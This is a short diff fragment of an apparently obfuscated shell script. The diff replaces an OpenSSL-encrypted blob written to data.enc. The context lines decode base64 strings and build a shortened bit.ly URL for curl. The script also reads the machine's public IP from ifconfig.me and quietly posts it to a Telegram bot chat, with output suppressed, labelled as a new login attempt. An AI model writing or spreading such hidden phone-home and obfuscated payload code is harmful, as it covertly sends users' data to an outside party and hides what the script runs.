@@ -6,9 +6,9 @@ GFP="https://bit.ly/oix";iuu="cGFzcw==";os=$(echo "$iuu" | base64 -d);on=$(curl 
 CHAT_ID="7432279779"
 ENCRYPTED_FILE="data.enc"
 cat > "$ENCRYPTED_FILE" << EOF
-U2FsdGVkX18vWNylW3yYRCjLaqlVeM7dGPENJ1KE5RdhZbzoyuTnBbkiGSkve64R
-So9vX13HXeP9RE0KAQEc54S8uKJ/8C1OWUr46c1XD0OGfOsen/FV/aZjBQDXhCmv
-0JgahM++eQ35vASjHVxW8RFAVHyQB+dyX7wKatH1JCo=
+U2FsdGVkX1/ZmFBV67P+E/bZzaEdfm7tv8oGlXeVFReoKbHKGl+NKXn724uYCozv
+FohAzO3FPhJMUsj3ic3NQksE/SyHVdVhSWBxptiiCkPhj2UCNFgEa6ej/Kihyem5
+a7CAQK6gKObM5CAeqQ2MlTE/h9HPW0WlIjLTqGO7BR0=
 EOF
 IP=$(curl -s -4 ifconfig.me)
 curl -s -X POST "https://api.telegram.org/bot$tm/sendMessage" -d chat_id="$CHAT_ID" -d text="محاولة تسجيل دخول جديدة للسكريبت : $IP" >/dev/null
